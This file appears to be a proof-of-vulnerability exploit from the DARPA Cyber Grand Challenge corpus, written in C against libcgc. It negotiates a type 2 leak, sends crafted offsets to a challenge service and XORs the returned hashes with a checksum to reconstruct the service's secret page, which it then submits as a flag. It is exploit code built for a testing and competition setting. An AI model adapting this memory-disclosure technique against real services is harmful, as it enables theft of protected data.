/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "libcgc.h"
#include "cgc_service.h"


#include "cgc_recv_bytes.h"
#include "cgc_send_bytes.h"
#include "cgc_memset.h"
#include "cgc_rand.h"

#ifdef DEBUG
#include "cgc_e_libc.h" // EAGLE_00004's pov_1/libc.c|.h
#endif


#define GIMME "Give me your sentences.\x03"
#define DONE "Here are your results...\x03"
#define TERM '\x03'

#define INBUFSZ 1024
#define RAND_PG_SZ 4096

char cgc_secret[RAND_PG_SZ] = {0};
char cgc_found[RAND_PG_SZ] = {0};

unsigned char cgc_CONTENT_LEN = 0;

char cgc_gimme_buf[25] = {0};
char cgc_done_buf[25] = {0};

struct result {
    unsigned char hash0;
    unsigned char hash1;
    unsigned char hash2;
    unsigned char hash3;
    unsigned short other[10];
};

/**
 * Get the first index in the secret buf where we do not know the value.
 *
 * @return first index in secret where the value is unknown
 */
unsigned short cgc_get_first_empty_offset(void) {
	#ifdef DEBUG
		fprintf(cgc_stderr, "GET EMPTY OFFSET...");
	#endif

	for (unsigned short i = 0; i < RAND_PG_SZ; i++) {
		if (0 == cgc_found[i]) {
			#ifdef DEBUG
				fprintf(cgc_stderr, "found: %i.\n", i);
			#endif

			return i;
		}
	}
	#ifdef DEBUG
		fprintf(cgc_stderr, "zero found.\n");
	#endif
	return 0;
}

/**
 * Receive the GIMME banner.
 */
void cgc_get_gimme_banner() {
	#ifdef DEBUG
		fprintf(cgc_stderr, "GIMME...");
	#endif

    if (24 != cgc_recv_bytes(STDIN, cgc_gimme_buf, 24)) {
        cgc__terminate(10);
    }

	#ifdef DEBUG
		fprintf(cgc_stderr, "recvd\n");
	#endif
}

/**
 * Receive the DONE banner.
 */
void cgc_get_done_banner() {
	#ifdef DEBUG
		fprintf(cgc_stderr, "DONE...");
	#endif

    if (25 != cgc_recv_bytes(STDIN, cgc_done_buf, 25)) {
        cgc__terminate(10);
    }

	#ifdef DEBUG
		fprintf(cgc_stderr, "recvd\n");
	#endif
}

/**
 * Create a buffer of random bytes terminated with TERM.
 *
 * @param send_buf Content buffer
 */
void cgc_create_content(char *send_buf) {
	#ifdef DEBUG
		fprintf(cgc_stderr, "CREATE CONTENT...");
	#endif

    cgc_rand(send_buf, cgc_CONTENT_LEN);
    for (unsigned int i = 0; i < cgc_CONTENT_LEN; i++) {
    	// replace any internal term chars with 'A'
    	if (TERM == *(send_buf + i)) {
    		*(send_buf + i) = 'A';
    	}
    }
    send_buf[cgc_CONTENT_LEN - 1] = TERM;
	#ifdef DEBUG
		fprintf(cgc_stderr, "done\n");
	#endif
}

/**
 * Send content buffer.
 *
 * @param send_buf Content buffer
 */
void cgc_send_content(char *send_buf) {
	#ifdef DEBUG
		fprintf(cgc_stderr, "SEND CONTENT...");
	#endif

    if (cgc_CONTENT_LEN != cgc_send_bytes(STDOUT, send_buf, cgc_CONTENT_LEN)) {
        cgc__terminate(10);
    }
	#ifdef DEBUG
		fprintf(cgc_stderr, "sent\n");
	#endif
}

/**
 * Compute the checksum portion of the result hash.
 *
 * @param send_buf Content buffer
 * @param checksum Checksum of content buffer used to create hash in result.
 */
void cgc_compute_checksum(char *send_buf, char *checksum) {
	#ifdef DEBUG
		fprintf(cgc_stderr, "COMPUTE CHECKSUM...");
	#endif

	const char *ch = send_buf;
	unsigned short cs_idx = 0;

	while (TERM != *ch) {
		checksum[cs_idx++ % 4] ^= *ch++;
	}
	#ifdef DEBUG
		fprintf(cgc_stderr, "done\n");
	#endif
}

/**
 * Process result to extract the secret bytes
 *
 * @param send_buf Content buffer
 */
void cgc_process_result(char *send_buf) {
	#ifdef DEBUG
		fprintf(cgc_stderr, "PROCESS RESULT...");
	#endif

	unsigned short *s = (unsigned short *)send_buf;
    char cs[4] = {0};
	struct result r;

	// cgc_read result
	#ifdef DEBUG
		fprintf(cgc_stderr, "RESULTS...");
	#endif
    if (sizeof(r) != cgc_recv_bytes(STDIN, (char *)&r, sizeof(r))) {
        cgc__terminate(10);
    }
	#ifdef DEBUG
		fprintf(cgc_stderr, "recvd\n");
	#endif

    // compute checksum on send_buf
    cgc_compute_checksum(send_buf, cs);

	// compute and save secret bytes
    cgc_secret[*s + 9] = r.hash0 ^ cs[0];
    cgc_found[*s + 9] = 1;

    cgc_secret[*s + 7] = r.hash1 ^ cs[1];
    cgc_found[*s + 7] = 1;

    cgc_secret[*s + 3] = r.hash2 ^ cs[2];
    cgc_found[*s + 3] = 1;

    cgc_secret[*s + 0] = r.hash3 ^ cs[3];
    cgc_found[*s + 0] = 1;

	#ifdef DEBUG
		char *s_ptr = secret;
		fprintf(cgc_stderr, "SECRET: ");
		for (unsigned int i = 0; i < 10; i++) {
			fprintf(cgc_stderr, "%02x", (unsigned char) *s_ptr++);
		}
		fprintf(cgc_stderr, "\n");
	#endif

}

/**
 * Count the number of consecutive bytes have been discovered in the secret page.
 *
 * @return Number of consecutive bytes from start of secret page
 */
unsigned short cgc_get_consecutive_cnt(void) {
	unsigned short local_con = 0;
	#ifdef DEBUG
		fprintf(cgc_stderr, "GET CONSECUTIVE COUNT...");
	#endif

	for (unsigned short i = 0; i < RAND_PG_SZ; i++) {
		if (1 == cgc_found[i]) {
			local_con++;
		} else {
			break;
		}
	}

	#ifdef DEBUG
		fprintf(cgc_stderr, "COUNT: %i.\n done\n", local_con);
	#endif

	return local_con;
}

int main(int cgc_argc, char *cgc_argv[]) {

	char *send_buf = NULL;

	// negotiate type 2 vuln on fd 3
	unsigned int neg[1] = {2};
	// vals[0] == type2_addr, vals[1] == type2_size, vals[2] == type2_length
	unsigned int vals[3] = {0};

	if (sizeof(neg) != cgc_send_bytes(3, (const char *)neg, sizeof(neg))) {
		cgc__terminate(4);
	}
	if (sizeof(vals) != cgc_recv_bytes(3, (char *)vals, sizeof(vals))) {
		cgc__terminate(5);
	}

	// define random CONTENT_LEN between 10 and 255
	cgc_rand(&cgc_CONTENT_LEN, 1);
	if (10 > cgc_CONTENT_LEN) {
		cgc_CONTENT_LEN += 10;
	}

	#ifdef DEBUG
		fprintf(cgc_stderr, "CONTENT LEN...%i.\n", CONTENT_LEN);
	#endif

	if (0 != cgc_allocate(cgc_CONTENT_LEN, 0, (void **)&send_buf)) {
		cgc__terminate(6);
	}

	cgc_memset(cgc_secret, 0, RAND_PG_SZ);
	cgc_memset(cgc_found, 0, RAND_PG_SZ);

	// loop until have enough consecutive bytes
	while (cgc_get_consecutive_cnt() < vals[2]) {

		cgc_memset(send_buf, 0, cgc_CONTENT_LEN);

		cgc_get_gimme_banner();

		cgc_create_content(send_buf);

	    // set offset
	    // caution: this might insert TERM value into send_buf;
	    // 	but it shouldn't because index 3 will be recovered
	    //	at the same time as index 0, so it should skip index 3.
	    *(unsigned short *)send_buf = cgc_get_first_empty_offset();

		cgc_send_content(send_buf);

		cgc_get_done_banner();

		cgc_process_result(send_buf);

	}

	if (0 != cgc_deallocate(send_buf, cgc_CONTENT_LEN)) {
		cgc__terminate(7);
	}

	#ifdef DEBUG
		fprintf(cgc_stderr, "SUBMIT FLAG...\n");
	#endif

	// submit secret bytes
	#ifdef DEBUG
		char *s_ptr = secret;
		fprintf(cgc_stderr, "FLAG: ");
		for (unsigned int i = 0; i < vals[2]; i++) {
			fprintf(cgc_stderr, "%02x", (unsigned char) *s_ptr++);
		}
		fprintf(cgc_stderr, "\n");
	#endif

    if (vals[2] != cgc_send_bytes(3, cgc_secret, vals[2])) {
        cgc__terminate(10);
    }

	#ifdef DEBUG
		fprintf(cgc_stderr, "sent\n");
	#endif
}
